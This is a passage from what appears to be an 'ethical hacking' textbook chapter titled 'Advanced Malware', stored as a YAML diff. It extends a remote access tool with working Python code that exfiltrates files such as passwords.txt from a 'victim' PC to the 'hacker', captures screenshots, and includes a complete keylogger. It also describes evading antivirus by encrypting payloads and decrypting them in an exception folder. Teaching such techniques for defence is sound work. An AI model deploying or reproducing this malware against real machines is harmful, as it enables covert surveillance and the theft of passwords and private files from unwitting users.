@@ -1,0 +1,955 @@
+- en: '*Chapter 7*: Advanced Malware'
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: 'In the previous chapter, we learned how to create a very simple malware that
+    executes *Windows* commands sent by a hacker and returns the results of these
+    commands. This program is very limited in terms of its ability to just execute
+    commands. Ideally, for a **Remote Access Tool**, we would want to have much more
+    advanced functionalities than this. This chapter will give you a basic idea of
+    what more advanced functionalities you can write inside your malware program.
+    We will cover the following topics in this chapter:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: File transfer
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Stealing Wi-Fi credentials
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Taking screenshots
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Building a keylogger file transfer
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: We have already learned how to send and receive very basic data in the program
+    we developed in [*Chapter 6*](B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130),
+    *Malware Development*. In this chapter, we will try to send and receive files
+    from one PC to another, first from the victim's PC to the hacker's PC, and then
+    from the hacker's to the victim's PC. This will give us access to any sensitive
+    files present on the victim's PC. For example, let's say that the victim has stored
+    their passwords in a file present on their PC (which is a very bad idea; never
+    store your passwords in a plain text file on your PC); then we can simply read
+    the contents of the file and send it to the hacker. Let's see how this works.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Downloading the victim file to the hacker
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'Here, we will modify the program we developed in [*Chapter 6*](B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130),
+    *Malware Development*, where we ran Windows commands to add functionality for
+    file transfer (see the *Creating malware* section). First, we will add a download
+    functionality to send any file from the victim''s PC to the hacker''s PC and later
+    in the other direction. To send files over the network, we need to perform certain
+    steps. These are listed next:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Check whether the file exists. If it does not, throw an error.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: If the file exists, read the contents of the file into your program.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Once the contents are read, add a special marker to the end of the data to signify
+    file transfer completion.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Send the data bytes over the network.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: On the receiving side, receive the bytes until you match the marker.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Once the marker is identified, remove the marker from the received bytes.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Write the rest of the bytes onto the filesystem of your PC.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Close the connection.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Don't worry if you don't understand these steps straight away. We will go through
+    these steps one by one. You can add this functionality to the program we already
+    developed in [*Chapter 6*](B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130), *Malware
+    Development*. To make things simpler, use the hacker and victim programs we developed
+    in the *Creating malware* section from [*Chapter 6*](B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130),
+    *Malware Development*. Create a new project in the Kali and Windows PCs for a
+    hacker and server, and this time call it *advanced_server* and *advanced_victim*.
+    Copy the code from previous chapters into the respective projects so that you
+    have the code base to build on.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Let's start by first defining how we will send the file from the victim to the
+    hacker. Let's say there is a file present on the victim's PC with the victim's
+    passwords stored. This is used as an example. Theoretically, you can download
+    any file from the victim's PC that you want to.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Let''s say the filename is **passwords.txt**. Let''s take a look at the strategy
+    in graphic form to understand how this will work in practice:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.1 – Sending a file to the hacker'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_07_01.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.1 – Sending a file to the hacker
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'First, we need to send the victim''s filename from the hacker to the victim.
+    We have already seen how we can send text data over the network when we learned
+    about sockets in [*Chapter 6*](B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130),
+    *Malware Development*, so this process is fairly straightforward. On the hacker
+    program, we will design the following strategy to send the filename that we need
+    to download from the victim. Our command will look something like this, **download
+    passwords.txt**, if we want to download a file named **passwords.txt**. So, on
+    the hacker program, we will check whether the hacker command starts with **download**
+    to create a case for this condition. Let''s take a look at the following code.
+    In our main loop, where we check for different conditions, we will insert the
+    following check:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'elif command.startswith("download"):'
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket.send(command.encode())
+  prefs: []
+  type: TYPE_NORMAL
+- en: exist = hacker_socket.recv(1024)
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The first line checks whether the hacker''s command is to download the file
+    from the victim. If it is, we will send the command to the victim and the victim
+    will reply whether the file exists. Depending on the reply, further action may
+    be taken. If the file exists, we will handle the case for downloading the file,
+    otherwise we will simply exit the program safely. Now, let''s stop on the hacker
+    program for a moment and go to the victim program. On the victim side, we need
+    to add a similar case for checking whether the command is **download**. If it
+    is, we will retrieve the filename from the received message and check whether
+    the file exists. Go to the victim program and write the following check in the
+    main loop:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'elif hacker_command.startswith("download"):'
+  prefs: []
+  type: TYPE_NORMAL
+- en: file_to_download = hacker_command.strip("download ")
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'if os.path.exists(file_to_download):'
+  prefs: []
+  type: TYPE_NORMAL
+- en: exists = "yes"
+  prefs: []
+  type: TYPE_NORMAL
+- en: victim_socket.send(exists.encode())
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'else:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: exists = "no"
+  prefs: []
+  type: TYPE_NORMAL
+- en: victim_socket.send(exists.encode())
+  prefs: []
+  type: TYPE_NORMAL
+- en: continue
+  prefs: []
+  type: TYPE_NORMAL
+- en: Here, we are receiving the command and checking the type of command. Once we
+    receive the command, which has a download string inside it, we can strip the download
+    part from the command to retrieve the actual filename we are interested in. On
+    the third line in the previous code, we check whether the file exists. If it does,
+    we send back **yes**, otherwise we send back **no**. Remember that in the hacker
+    program, we are waiting to receive this reply in the **exists** variable. Note
+    that we haven't sent any file data yet. We are just creating the outer loop to
+    properly handle the sending and receiving of data. The read part of the file will
+    be handled in the first **if** statement in the previous code. Now we will need
+    to read the file.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Let''s take a look at the code that follows, which reads the file from the
+    victim''s machine and then sends the file back to the hacker:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'with open(file_to_download, "rb") as file:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: chunk = file.read(CHUNK_SIZE)
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'while len(chunk) > 0:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: victim_socket.send(chunk)
+  prefs: []
+  type: TYPE_NORMAL
+- en: chunk = file.read(CHUNK_SIZE)
+  prefs: []
+  type: TYPE_NORMAL
+- en: '# This will run till the end of file.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: once the file is complete, we need to send the marker.                            victim_socket.send(eof_identifier.encode())
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: print("File sent successfully")
+  prefs: []
+  type: TYPE_NORMAL
+- en: Let's break down the code we just saw. The file line is a command to open and
+    read the file in binary format. Even though it is a text file, it is a good idea
+    to read files in binary format if you want to transfer them over the network since
+    the file type could be anything in practical cases. Then we read a chunk of bytes,
+    and we define **CHUNK_SIZE = 2048** at the top of the file. After we have read
+    the first chunk, we check whether the file has more bytes. If it has, we send
+    them iteratively over the network by using the **while** loop until we read the
+    end of the file. This loop will stop when there is no further chunk to read from
+    the file. Once we have sent the complete file over the network to the hacker,
+    we need to send the identifier marker for the hacker to know that they can stop
+    reading further. To do that, we send **eof_identifier**, which has the following
+    value, **eof_identifier = "<END_OF_FILE_IDENTIFIER>"**. The hacker will use this
+    identifier to know that the incoming data is complete.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Next, we need to receive this data in the hacker program. To do this, go to
+    the hacker program and check the value received for the **exists** variable. If
+    the reply from the victim is **yes**, this means that the file exists on the victim''s
+    machine and we can start downloading it. Note that we just developed the program
+    to send data, and now here we will receive the same data. The received data will
+    be in the form of bytes, and we will write these bytes onto our hacker''s PC to
+    generate the same file as on the victim''s PC. Let''s take a look at the following
+    code:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'if exist.decode() == "yes":'
+  prefs: []
+  type: TYPE_NORMAL
+- en: print("file exists")
+  prefs: []
+  type: TYPE_NORMAL
+- en: '# receive file here'
+  prefs: []
+  type: TYPE_NORMAL
+- en: file_name = command.strip("download ")
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'with open(file_name, "wb") as file:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: print("Downloading file")
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'while True:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: chunk = hacker_socket.recv(CHUNK_SIZE)
+  prefs: []
+  type: TYPE_NORMAL
+- en: file.write(chunk)
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'if chunk.endswith(eof_identifier.encode()):'
+  prefs: []
+  type: TYPE_NORMAL
+- en: chunk = chunk[:-len(eof_identifier)]
+  prefs: []
+  type: TYPE_NORMAL
+- en: file.write(chunk)
+  prefs: []
+  type: TYPE_NORMAL
+- en: break
+  prefs: []
+  type: TYPE_NORMAL
+- en: print("Successfully downloaded, ", file_name)
+  prefs: []
+  type: TYPE_NORMAL
+- en: If the file exists, we create a new file with the same name as **file_name**.
+    Note that we create the file in **wb** or write binary mode, so that we can download
+    any type of file. Once we create a file, we need to write the received file content
+    that we receive from the victim. We define the **CHUNK_SIZE** variable equal to
+    the same size as we defined in the victim while sending the data, and then we
+    start receiving data continuously and write it to the disk until the end, which
+    is identified by the marker. You need to define the exact same **eof_identifier**
+    variable as you defined in the victim, otherwise the program will not work. Once
+    we reach the identifier, we remove the identifier, write the remaining bytes to
+    the disk, and exit the loop. Finally, we can print the statement indicating that
+    we have received all the data. Now that our program is complete, using this program,
+    we can download data from the victim to the hacker.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The complete code for the hacker is given here:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example10-hacker-advanced/hacker.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example10-hacker-advanced/hacker.py'
+  prefs: []
+  type: TYPE_NORMAL
+- en: )
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Similarly, the complete code for the victim for sending the file to the hacker
+    is given here:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example11-advanced-victim/advanced-victim.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example11-advanced-victim/advanced-victim.py'
+  prefs: []
+  type: TYPE_NORMAL
+- en: )
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now, let's try running this program. First, run the hacker and then the victim
+    program.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Create a file in the victim''s PC with the name **passwords.txt** and write
+    some random passwords into it:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.2 – Passwords file on the victim''s PC'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_07_02.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.2 – Passwords file on the victim's PC
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Next, write the following command in the hacker program: **download passwords.txt**.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Now, once the program is run, you will see the exact same file on the hacker''s
+    PC:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.3 – Downloading a file from the victim'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_07_03.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.3 – Downloading a file from the victim
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'You will see that a file with the name **passwords.txt** has been created on
+    the Kali machine and if you open this file, it will have the same contents as
+    the one located on the victim''s PC:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.4 – passwords.txt file on the hacker''s machine'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_07_04.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.4 – passwords.txt file on the hacker's machine
+  prefs: []
+  type: TYPE_NORMAL
+- en: If you open the file, you will see the contents of the file. You can try downloading
+    other types of files as well, such as images, and this will also work.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Uploading files to the victim
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: The process of uploading files to the victim is very similar, except that the
+    data now will go in the opposite direction. Using this method, you can potentially
+    upload other advanced malware to the victim's machine and run it. However, the
+    malware can't be uploaded directly. The **Intrusion Detection System** (**IDS**)
+    will detect it. If we try to upload it directly, some modifications will be required
+    to upload other malware using this method. First, you need to encrypt the malware
+    bytes and send the encrypted data over the network. Let's try to understand how
+    the IDS works. Antiviruses have a huge database of malware file signatures. A
+    signature, in the simplest terms, is a sequence of bytes from a malware program.
+    So, if a signature of a file matches with the database of the antivirus program,
+    the antivirus program will know that the file is malware. In order to beat it,
+    we need to encrypt the data. Once the malware is encrypted, its sequence of bytes
+    changes and the antivirus program will think that it is not malware. However,
+    we still need to decrypt these files to make them run properly. Let's say we send
+    encrypted malware over the network to the victim using the method we just developed.
+    The encrypted file will be sent to the victim and when we try to decrypt it to
+    retrieve the original file, the antivirus program will detect it immediately and
+    block this file. This doesn't sound like very good news. However, we can beat
+    this detection if we decrypt the file in a folder that is added to the antivirus
+    exception folder. This antivirus program will not scan this folder and we can
+    successfully decrypt the malware and run it. There is one small caveat here, however.
+    To add a folder to antivirus exceptions, we require administrator privileges.
+    We will see later in [*Chapter 8*](B14788_08_Final_JC_ePub.xhtml#_idTextAnchor160),
+    *Post Exploitation*, how we can get administrator privileges. The code for uploading
+    files to the hacker will be very similar, so it will be redundant to discuss it
+    here again. I have already discussed how we can send it over the network. In the
+    next section, we will learn how we can steal Wi-Fi passwords stored on the PC.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Taking screenshots
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: 'You can also take screenshots of the victim''s PC using your malware. For this,
+    you will need to install additional libraries. We will need a module called **pyautogui**.
+    This module will help you to take a screenshot on the victim''s PC:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To install it, go to your victim''s machine and write the following command
+    to install it. It''s a good idea to create a virtual environment and install this
+    program in the virtual environment:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**pip install pyautogui**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: This will install the requisite module.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Next, we need to define the case for taking a screenshot. In the hacker program,
+    create a new case and set the following condition:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'if command == "screenshot":'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: print("Taking screenshot")
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Similarly, on the victim program, write the same case as well:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'elif hacker_command == "screenshot":'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: print("Taking screenshot")
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: screenshot = pyautogui.screenshot()
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: screenshot.save("screenshot.png")
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: print("screenshot saved")
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: This will save the screenshot on the victim's PC as **screenshot.pn**.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Let's run this program and see what the output looks like. On the hacker's machine,
+    the output should look like this:![Figure 7.5 – Hacker program taking a screenshot
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '](image/B14788_07_05.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 7.5 – Hacker program taking a screenshot
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The victim program looks like this:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 7.6 – Victim program taking a screenshot'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](image/B14788_07_06.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 7.6 – Victim program taking a screenshot
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'If you go to the victim''s PC, you will see that a file is saved on the disk
+    named **screenshot.png**. You can retrieve this file to the hacker''s PC using
+    the method we learned earlier. Just write the following command in the hacker
+    program:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**download screenshot.png**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'This will move the screenshot to the hacker''s PC. I took the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 7.7 – Screenshot taken on a Windows PC'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_07_07.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.7 – Screenshot taken on a Windows PC
+  prefs: []
+  type: TYPE_NORMAL
+- en: In this section, we have learned how we can take a screenshot of the victim's
+    PC using our hacker program and how we can transfer the file over to the hacker's
+    PC. In the next section, we will learn how to create a keylogger to keep track
+    of the victim's keystrokes.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Keylogger
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: 'In this section, we will build a simple keylogger. A keylogger is a malware
+    program that records the keystrokes of the user. It is one of the most common
+    kinds of malware programs. Keyloggers are often used to steal passwords and other
+    sensitive information, such as credit cards. Keyloggers are often made to be as
+    silent as possible, which means that it is very hard to detect keyloggers. Let''s
+    try building a simple keylogger. You will need to install a module called **pynput**
+    to build a keylogger. This module allows you to access keystrokes programmatically:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To install this module, use the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**pip install pynput**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'This will install the module:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Once the module is installed, we can import **keyboard** from this module:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**from pynput import keyboard**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Next, we will define a listener for listening to keystrokes. This listener
+    will handle different cases on different events. Take a look at the following
+    code:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'with keyboard.Listener(on_press=onPress, on_release=onRelease) as listener:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: listener.join()
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: The previous code defines two functions for the *press* and *release* of a keystroke.
+    When a key is pressed, the **onPress** function will be called, and when a key
+    is released, the **onRelease** function will be called.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Now we will define these functions. Let''s take a look at the functions:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'def onPress(key):'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: print(str(key))
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'def onRelease(key):'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'if str(key) == ''Key.esc'':'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: return False
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We have defined very simple functions. When we press the key, we simply print
+    it, and when the key is released, we check for which key was pressed. If the pressed
+    key was the *Esc* key, we exit the program, otherwise we continue. This way, we
+    have an exit condition and don''t get stuck. If we don''t define this condition,
+    we can''t exit the program, since pressing *Ctrl* + *C* would simply print it
+    instead of exiting. To safely return from this function, we return the **False**
+    value. Let''s take a look at a simple execution:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 7.8 – Printing pressed keys'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](image/B14788_07_08.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 7.8 – Printing pressed keys
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: In this screenshot, we print the keys we pressed during execution of the program.
+    When we pressed the *Esc* key, it exited the program. This is all there is to
+    a very basic keylogger. However, in practical cases, you will be running this
+    program on the victim's machine, so just printing on the console is not very helpful.
+    Ideally, we would want to keep a log of these keystrokes. A lot of keyloggers
+    store the keystrokes in a file, which hackers can retrieve and see whether any
+    password or other sensitive information was typed.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Now we will make changes to our keylogger to make it more useful. Let's create
+    a new filename, **keylogs.txt**.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'We will store our logs in this file. Let''s take a look at the code:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: import sys
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: filename = "keylogs.txt"
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: file = open(filename, "w")
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'def onPress(key):'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: print(str(key))
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: file.write(str(key))
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'def onRelease(key):'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'if str(key) == ''Key.esc'':'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: file.close()
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: sys.exit(0)
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Here we create a file in write mode and every time a key is pressed, we store
+    the key in the file. Finally, when the *Esc* key is pressed, we close the file
+    and exit. If you start the program and run it and press some keys, you will see
+    that a new file is created, and all the key logs are stored inside the file. Here
+    is the result of me executing this operation:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 7.9 – Stored keystrokes in a file'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](image/B14788_07_09.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 7.9 – Stored keystrokes in a file
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'You can see in the preceding screenshot that each character has quotation marks
+    around it. We can remove these quotation marks for better visibility. In order
+    to replace it, we can update the following code:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'def onPress(key):'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: print(str(key))
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: stroke = str(key).replace("'", "")
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'if str(key) == "Key.esc":'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: file.write(" ")
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'else:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: file.write(stroke)
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Here, we made two changes. First, we replaced single quotes with empty strings
+    before writing them into the file and secondly, if the key is *Esc*, we don't
+    write it onto the file. Now, if you run the program, you will see that it only
+    registers characters.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'If you press any special key, such as *Enter* or *space*, you will see that
+    the program registers their name instead of their functionality, which is not
+    what we want. We would like to see a space when a user presses the space button.
+    To achieve this, we will add the following changes:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'def onPress(key):'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: print(str(key))
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: stroke = str(key).replace("'", "")
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'if str(key) == "Key.space":'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: file.write(" ")
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'elif str(key) == "Key.enter":'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: file.write("\n")
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'elif str(key) == "Key.esc":'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: file.write(" ")
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'else:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: file.write(stroke)
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Our keylogger is almost complete. We just need to add one final modification.
+    Our keylogger doesn''t support backspace. To add this functionality, take a look
+    at the following code:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: import os
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'elif str(key) == "Key.backspace":'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: file.seek(file.tell()-1, os.SEEK_SET)
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: file.write("")
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'This code checks for a backspace, and if we encounter one, we move back one
+    character and put an empty string there. This replaces the existing character
+    stored on the file. Now, our basic keylogger is complete. It supports character
+    insertion, along with the ability to register backspaces as well. The complete
+    program for the keylogger is written here:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: from pynput import keyboard
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: import sys
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: import os
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: filename = "keylogs.txt"
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: file = open(filename, "w")
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'def onPress(key):'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: print(str(key))
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: stroke = str(key).replace("'", "")
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'if str(key) == "Key.space":'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: file.write(" ")
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'elif str(key) == "Key.enter":'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: file.write("\n")
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'elif str(key) == "Key.esc":'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: file.write(" ")
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'elif str(key) == "Key.backspace":'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: file.seek(file.tell()-1, os.SEEK_SET)
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: file.write("")
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'else:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: file.write(stroke)
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'def onRelease(key):'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'if str(key) == ''Key.esc'':'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: file.close()
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: sys.exit(0)
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'if __name__ == "__main__":'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'with keyboard.Listener(on_press=onPress, on_release=onRelease) as listener:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: listener.join()
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: In this section, we have learned how we can deploy a simple keylogger. Using
+    this as a base, you can write a far more advanced keylogger.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Summary
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: In this chapter, we have learned how we can add advanced functionalities to
+    our basic malware. First, we added support for file transfer from the victim to
+    the client, and then we added additional features, such as taking a screenshot
+    from the victim's machine and sending it back to the hacker. Finally, we built
+    our own keylogger. Every day, thousands of pieces of malware are written and antivirus
+    programs try to keep up with them for detection. The advantage of writing your
